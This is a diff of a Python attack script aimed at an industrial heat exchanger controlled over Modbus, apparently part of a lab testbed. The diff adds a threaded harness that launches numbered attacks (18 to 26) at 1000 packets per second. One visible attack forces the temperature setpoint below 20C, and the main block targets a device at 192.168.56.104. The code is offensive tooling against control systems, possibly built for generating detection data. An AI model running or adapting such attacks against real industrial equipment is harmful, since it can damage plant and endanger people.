@@ -12,17 +12,65 @@ being performed on the system.
 
 """
 import socket
-import threading
 import pickle
-import time
-from HeatExchangerModbusUtility import HeatExchangerModbusUtility
+from threading import Thread
+from HeatExchangerModbusUtility import ModbusUtility
+from HeatExchangerAttackUtility import AttackTask
 
 MODBUS_PKT_SIZE=55
+PKT_PER_SEC = 1000
 
 class attack:
-
     def __init__(self, ip, port):
-        self.he = HeatExchangerModbusUtility( ip )
+        self.he = ModbusUtility( ip )
+        self.CurrentAttack = None
+        self.ThreadDict = {}
+
+        self.AttackDict = {
+            18: self.Attack18,
+            19: self.Attack19,
+            20: self.Attack20,
+            21: self.Attack21,
+            22: self.Attack22,
+            23: self.Attack23,
+            24: self.Attack24,
+            25: self.Attack25,
+            26: self.Attack26,
+        }
+
+    def RunAttack( self, AttackNumber, pkt_per_sec=PKT_PER_SEC ):
+        # Set label to attack label
+
+        # Create attack task
+        tsk = AttackTask( self.AttackDict[ AttackNumber ], pkt_per_sec )
+
+        # Create attack task thread
+        t = Thread(target = tsk.run )
+
+        # Stop thread and remove it from thread dict if already present / running
+        if( AttackNumber in self.ThreadDict.keys() ):
+            self.ThreadDict[AttackNumber]["task"].terminate()
+            self.ThreadDict[AttackNumber]["thread"].join()
+            del self.ThreadDict[AttackNumber]
+
+        # Insert into thread dict
+        self.ThreadDict[AttackNumber] = {"thread": t, "task": tsk}
+
+        # Start thread (This may not work as I am unsure how adding it to
+        # dictionary first and then running it will effect future operations.)
+        t.start()
+
+    def StopAttack( self, AttackNumber ):
+        if( AttackNumber in self.ThreadDict.keys() ):
+            self.ThreadDict[AttackNumber]["task"].terminate()
+            self.ThreadDict[AttackNumber]["thread"].join()
+            del self.ThreadDict[AttackNumber]
+
+    def StopAllAttacks( self ):
+        # Changing to list is necessary since the dictionary keys object will change
+        # size after deleting elements. For loop no likey and thows errors
+        for AttackNumber in list( self.ThreadDict.keys() ):
+            self.StopAttack( AttackNumber )
 
     def Attack18( self ):
         # #18 -- Set the value of setpoint below 20C
@@ -63,6 +111,5 @@ class attack:
 if __name__=="__main__":
     attacker = attack( "192.168.56.104", "502" )
     attacker.he.PrintAllRegisters()
-    while True:
-
-        attacker.he.WriteRegister( "Setpoint", 70 )
+    attacker.RunAttack( 19 )
+    attacker.StopAllAttacks()
